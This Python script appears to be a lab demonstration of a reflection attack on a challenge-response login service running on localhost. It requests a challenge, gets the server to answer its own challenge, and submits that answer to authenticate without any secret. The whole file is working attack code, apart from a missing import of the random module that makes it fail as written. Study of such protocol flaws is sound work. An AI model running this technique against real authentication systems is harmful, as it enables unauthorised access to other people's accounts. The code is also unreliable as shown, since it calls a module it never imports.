import requests
import time,sys
import string


user = ''.join(random.choice(string.digits) for _ in range(10))
print('STARTING A REFLECTION ATTACK...')
print('\n')
print('1. Asking a challenge to the server')
URL = "http://127.0.0.1:5000/requestchallenge"
params = {'user':user}
r = requests.get(url = URL,params=params)
data = r.json()
challenge = data['challenge']
print('CHALLENGE PROPOSED: '+challenge)

print('\n')
print('2. Asking the same challenge to the server')
URL = "http://127.0.0.1:5000/responseToAChallenge"
params = {'user':user, 'challenge':challenge}
r = requests.get(url = URL, params=params)
data = r.json()
response_challenge = data['response']

if response_challenge=='CHALLENGED FORMAT UNKNOWN':
	print('something went wrong: I am NOT AUTHENTICATED')
else:
	print('SERVER RESPONSE: '+response_challenge)
	print('\n')
	print('3. sending the challenge response to the server\n')
	URL = "http://127.0.0.1:5000/responseOfAChallenge"
	params = {'user':user, 'response':response_challenge}
	r = requests.get(url = URL, params=params)
	data = r.json()
	result = data['message']


	if result=='AUTHENTICATED':
		print('I am AUTHENTICATED')
	else:
		print('something went wrong: I am NOT AUTHENTICATED')



